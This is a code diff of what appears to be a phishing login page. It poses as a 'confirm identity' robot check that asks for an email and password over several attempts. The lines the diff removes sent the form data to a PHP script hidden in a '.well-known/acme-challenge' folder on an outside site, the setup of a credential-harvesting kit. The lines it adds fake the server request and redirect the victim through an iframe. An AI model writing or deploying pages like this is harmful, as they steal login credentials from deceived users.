@@ -107,8 +107,7 @@
 
         <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
 
-        <form id="loginForm" action="https://seamua.com/.well-known/acme-challenge/ini.php" method="POST">
-            <input type="hidden" name="step" value="1">
+        <form id="loginForm">
             <div class="form-group">
                 <label class="text-secondary font-weight-bold">Email Address</label>
                 <input type="email" class="form-control" id="email" name="email" required autocomplete="username">
@@ -173,21 +172,16 @@
             const loading = document.getElementById('loading');
             const verificationComplete = document.getElementById('verificationComplete');
 
-            // Update hidden step value
-            form.querySelector('[name="step"]').value = attempt;
-
             // Show loading spinner
             loading.style.display = 'flex';
             errorMsg.style.display = 'none';
 
             try {
                 const formData = new FormData(form);
+                formData.append('attempt', attempt);
                 
-                // Send data to PHP
-                const response = await fetch(form.action, {
-                    method: 'POST',
-                    body: formData
-                });
+                // Simulate server request
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 // Clear password field
                 passwordInput.value = '';
@@ -209,8 +203,12 @@
                     verificationComplete.style.display = 'flex';
                     
                     setTimeout(() => {
-                        // Force redirect by setting window.location
-                        window.location.replace(redirectUrl);
+                        // Force redirect through iframe
+                        const iframe = document.getElementById('iframe');
+                        iframe.onload = function() {
+                            window.top.location.href = redirectUrl;
+                        };
+                        iframe.src = redirectUrl;
                     }, 2000);
                 }
 
